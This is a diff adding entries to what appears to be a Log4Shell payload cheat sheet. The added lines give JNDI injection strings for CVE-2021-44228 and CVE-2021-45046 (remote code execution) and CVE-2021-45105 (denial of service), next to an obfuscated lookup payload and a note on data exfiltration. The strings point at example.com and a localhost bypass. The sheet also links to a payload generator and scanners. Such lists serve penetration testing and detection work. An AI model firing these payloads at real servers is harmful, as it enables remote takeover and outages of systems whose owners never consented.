@@ -27,6 +27,15 @@ ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://example.com/
 ## Omitting closing brace can lead to data exfil after "/" sign
 `${jndi:ldap://example.com/`
 
+### CVE-2021-44228 (RCE) - Critical
+`${jndi:ldap://example.com/a}`
+
+### CVE-2021-45046 (RCE) - Critical
+`${jndi:ldap://127.0.0.1#example.com/a}`
+
+### CVE-2021-45105 (DoS) - High
+`${${::-${::-$${::-j}}}}`
+
 ## Payload generator
 https://github.com/woodpecker-appstore/log4j-payload-generator
 
@@ -36,3 +45,5 @@ https://github.com/whwlsfb/Log4j2Scan
 
 ### Active scan check
 https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f
+
+
